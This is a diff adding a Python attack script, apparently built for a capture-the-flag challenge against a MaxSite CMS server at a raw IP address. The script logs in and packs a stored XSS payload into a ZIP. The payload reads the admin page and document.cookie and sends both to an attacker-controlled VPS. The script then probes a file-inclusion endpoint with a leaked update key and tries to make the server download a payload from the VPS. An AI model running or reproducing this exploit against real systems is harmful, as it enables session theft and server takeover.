@@ -1,0 +1,101 @@
+import requests, re, base64, zipfile, io
+
+BASE = 'http://114.66.24.221:35708'
+VPS = 'http://139.224.255.61:8888'
+
+XSS = '<h2>Update</h2>\n<script>\nfetch("/admin",{credentials:"include"}).then(r=>r.text()).then(t=>{\nnew Image().src="' + VPS + '/?flag="+btoa(t);\nnew Image().src="' + VPS + '/?cookie="+document.cookie;\n});\n</script>'
+
+# Login first
+s = requests.Session()
+s.headers.update({'Referer': f'{BASE}/login'})
+r = s.get(f'{BASE}/login', timeout=10)
+h = re.findall(r'value="([a-f0-9]{32})"', r.text)
+sid = h[0] if h else ''
+s.post(f'{BASE}/login', data={
+    'flogin_redirect': f'{BASE}/',
+    'flogin_session_id': sid,
+    'flogin_user': 'hacker3@test.com',
+    'flogin_password': 'Hacker123456',
+    'flogin_submit': '',
+}, timeout=10, allow_redirects=True)
+print('[*] Logged in')
+
+# Create ZIP
+zb = io.BytesIO()
+with zipfile.ZipFile(zb, 'w') as zf:
+    zf.writestr('pages/000-pwn.html', XSS)
+zd = zb.getvalue()
+
+# The require-maxsite endpoint can include PHP files
+# When we include ctf/update-maxsite.php with Referer, it returns empty
+# Maybe it actually processes the request but needs the right POST data
+
+# Try including ctf/update-maxsite.php via require-maxsite with file upload
+print('\n=== Include update-maxsite.php via require-maxsite with file upload ===')
+b64 = base64.b64encode(b'ctf/update-maxsite.php').decode()
+
+# Try with various combinations
+combos = [
+    # (data_dict, files_dict, description)
+    ({'key': 'edge_key_release_2026'}, {'file': ('master.zip', zd, 'application/zip')}, 'key+zip'),
+    ({'key': 'edge_key_release_2026', 'action': 'upload'}, {'file': ('master.zip', zd, 'application/zip')}, 'key+action+zip'),
+    ({'key': 'edge_key_release_2026', 'action': 'extract'}, {'file': ('master.zip', zd, 'application/zip')}, 'key+extract+zip'),
+    ({'key': 'edge_key_release_2026'}, {'update_file': ('master.zip', zd, 'application/zip')}, 'key+update_file'),
+    ({'key': 'edge_key_release_2026'}, {'zip': ('master.zip', zd, 'application/zip')}, 'key+zip_field'),
+    ({}, {'file': ('master.zip', zd, 'application/zip')}, 'zip_only'),
+    ({'key': 'edge_key_release_2026'}, None, 'key_only'),
+]
+
+for data, files, desc in combos:
+    r = s.post(f'{BASE}/require-maxsite/{b64}', 
+        data=data,
+        files=files,
+        headers={'Referer': f'{BASE}/admin'},
+        timeout=10)
+    c = r.text.strip()
+    print(f'  {desc}: [{r.status_code}] len={len(c)} content=[{c[:200]}]')
+
+# Check if any upload worked
+r = requests.get(f'{BASE}/pages/000-pwn.html', timeout=5)
+print(f'\nCheck 000-pwn.html: [{r.status_code}]')
+
+# Also try including the update handler with session + admin referer
+# Maybe the update handler checks for admin session AND processes the zip
+print('\n=== Try other ctf PHP files with file upload ===')
+ctf_files = ['ctf/update.php', 'ctf/update-maxsite.php']
+for cf in ctf_files:
+    b64 = base64.b64encode(cf.encode()).decode()
+    r = s.post(f'{BASE}/require-maxsite/{b64}', 
+        data={'key': 'edge_key_release_2026'},
+        files={'file': ('master.zip', zd, 'application/zip')},
+        headers={'Referer': f'{BASE}/'},
+        timeout=10)
+    c = r.text.strip()
+    if c:
+        print(f'  {cf}: [{r.status_code}] {c[:300]}')
+
+# Maybe the update-maxsite needs the zip to be at a specific URL
+# and it downloads from that URL using the key
+# Let me try providing a URL where the zip is hosted
+print('\n=== Try update-maxsite with download URL ===')
+# First, host the zip on our VPS
+# For now, try providing URL parameters
+url_params = [
+    {'key': 'edge_key_release_2026', 'url': f'{VPS}/master.zip'},
+    {'key': 'edge_key_release_2026', 'download': f'{VPS}/master.zip'},
+    {'key': 'edge_key_release_2026', 'source': f'{VPS}/master.zip'},
+    {'key': 'edge_key_release_2026', 'zip_url': f'{VPS}/master.zip'},
+    {'key': 'edge_key_release_2026', 'from': f'{VPS}/master.zip'},
+]
+
+for params in url_params:
+    r = requests.post(f'{BASE}/update-maxsite/', 
+        data=params,
+        headers={'Referer': f'{BASE}/admin'},
+        timeout=10)
+    c = r.text.strip()
+    if c != 'Access is denied':
+        print(f'  [!] {params}: [{r.status_code}] {c[:200]}')
+
+# Check VPS logs for any download attempts
+print('\nDone. Check VPS logs for any incoming requests.')
